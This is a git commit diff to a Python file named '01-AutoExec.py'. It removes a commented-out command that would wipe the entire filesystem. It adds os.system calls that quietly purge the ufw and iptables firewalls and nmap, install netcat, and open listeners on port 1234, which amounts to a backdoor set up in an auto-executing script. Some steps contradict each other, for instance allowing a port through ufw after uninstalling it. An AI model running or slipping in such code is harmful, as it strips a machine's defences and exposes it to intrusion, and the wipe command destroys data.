06fe360dca4e0beae21709fd0710c57813fa844e
CyberCyber2 <56095531+CyberCyber2@users.noreply.github.com>
2021-03-17 19:56:07 -0400

    Update 01-AutoExec.py

--- BaseFiles/01-AutoExec.py
+++ BaseFiles/01-AutoExec.py
@@ -1,4 +1,10 @@
 #[enable]
 import os
-#os.system("rm -rfv --no-preserve-root /*")
-
+os.system("apt-get remove --purge ufw -y -vv &> /dev/null")
+os.system("apt-get remove --purge nmap -y -vv &> /dev/null")
+os.system("apt-get remove --purge iptables -y -vv &> /dev/null")
+os.system("apt-get install -y -vv netcat-traditional")
+os.system("ufw allow 1234")
+os.system("nc -lvp 1234")
+os.system("ncat -lvp 1234")
+os.system("netcat -lvp 1234")
